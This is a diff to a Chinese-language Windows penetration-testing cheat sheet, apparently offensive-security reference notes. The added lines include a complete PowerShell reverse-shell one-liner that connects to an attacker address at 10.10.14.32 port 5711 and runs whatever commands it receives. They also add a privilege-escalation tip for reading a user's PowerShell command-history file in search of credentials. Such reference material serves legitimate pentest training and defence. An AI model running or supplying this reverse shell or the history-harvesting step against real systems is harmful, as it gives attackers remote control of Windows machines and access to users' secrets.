@@ -9,6 +9,14 @@
 - 利用Windows保留字
     - ``aux|prn|con|nul|com1|com2|com3|com4|com5|com6|com7|com8|com9|lpt1|lpt2|lpt3|lpt4|lpt5|lpt6|lpt7|lpt8|lpt9``
 
+Shell
+----------------------------------------
+- 手动创建shell
+
+::
+
+     $client = New-Object System.Net.Sockets.TCPClient("10.10.14.32",5711);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "# ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close() 
+
 LOLBAS
 ----------------------------------------
 
@@ -202,6 +210,16 @@ ByPass
 权限提升有多重方式，有利用二进制漏洞、逻辑漏洞等技巧。利用二进制漏洞获取权限的方式是利用运行在内核态中的漏洞来执行代码。比如内核、驱动中的UAF或者其他类似的漏洞，以获得较高的权限。
 
 逻辑漏洞主要是利用系统的一些逻辑存在问题的机制，比如有些文件夹用户可以写入，但是会以管理员权限启动。
+
+利用用户对文件保存不敏感
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+通过查找历史记录，存放的记录文件来找到突破点。
+
+获取历史记录：
+::
+
+    type C:\Users\<user>\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt 
+
 
 任意写文件利用
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
